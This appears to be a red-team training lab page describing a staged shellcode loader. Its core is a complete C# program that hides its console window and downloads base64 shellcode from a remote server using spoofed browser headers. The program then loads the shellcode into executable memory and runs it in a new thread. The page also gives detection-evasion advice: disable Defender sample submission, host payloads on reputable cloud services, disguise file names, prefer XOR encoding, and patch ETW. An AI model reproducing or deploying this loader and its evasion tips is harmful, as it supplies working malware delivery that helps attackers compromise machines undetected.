# Lab - Staged Loader
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>

> ***IMPORTANT*** : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
> **Make sure at all times that sample submussion in Microsoft Defender is `turned off`, and if for some reason you get prompted to submit a sample, deny the request.**


> ***BEST PRACRICES***:
> By removing the payload from our loader, there is no malicious code that *static analysis* can detect. ***HOWEVER***, by shifting the code from being hardcoded into the loader to external server, it provides more IOC's for dynamic/behavioural analysis. Therefore make sure that:
> 1. Host your payload on a reputable server (onedrive, Dropbox, Akamai etc...)
> 2. Use an FQDN, not an IP address (i.e. key.crimsoncore.be instead of 192.168.100.25)
> 3. Use HTTPS to download the shellcode - the shellcode never touches disk, it gets loaded into the buffer of a program, but we want to evade network based detections
> 4. make the webrequest look legit (user agent, headers etc...)
> 4. Use a name for the shellcode that looks normal (i.e. not shellcode.bin but update.dat for example)

Advantages : Easy to change shellcodes (as they're hosted), harder to detect by static analysis.



```csharp
using System;
using System.Runtime.InteropServices;
using System.Net;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;

        static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            string payloadUrl = "http://10.0.0.6:9090/demon.sc.x64.b64";
            byte[] shellCode;

            using (WebClient client = new WebClient())
            {
                // Add HTTP headers    
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36");
                client.Headers.Add("Accept", "application/octet-stream");
                client.Headers.Add("Accept-Encoding", "gzip, deflate");
                client.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                client.Headers.Add("Referer", "https://www.contoso.com/support/downloads/latest-updates");
                // Download the Base64-encoded string
                string base64String = client.DownloadString(payloadUrl);
                // Decode the Base64 string to bytes
                shellCode = Convert.FromBase64String(base64String);
            }

            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            Marshal.Copy(shellCode, 0, funcAddr, shellCode.Length);

            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

> IMPORTANT: When adding sandbox evasion modules, make sure they do their checks first before execution any other code. Stay away from AES, RC encryption as this is easily detected - use XOR-encoding instead
>
> <https://github.com/nullsection/SharpETW-Patch/blob/main/PatchInMemory.cs>